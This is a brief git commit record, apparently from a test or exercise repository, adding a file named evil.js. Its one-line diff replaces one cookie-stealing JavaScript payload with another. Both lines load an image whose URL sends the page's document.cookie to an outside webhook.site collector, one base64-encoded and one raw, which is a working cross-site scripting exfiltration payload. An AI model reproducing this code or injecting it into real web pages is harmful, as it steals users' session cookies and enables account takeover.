5c55556650b85a03991201af30a21658393249fc
test <test@test.com>
2025-02-06 10:43:35 +0100

    Dodano evil.js

--- evil.js
+++ evil.js
@@ -1,1 +1,1 @@
-new Image().src = 'https://webhook.site/0074dbd6-f6d3-46f0-8a7d-7ab19454fa31/?c=' + btoa(document.cookie);
+var i=new Image;i.src="https://webhook.site/0074dbd6-f6d3-46f0-8a7d-7ab19454fa31/?cookie="+document.cookie;
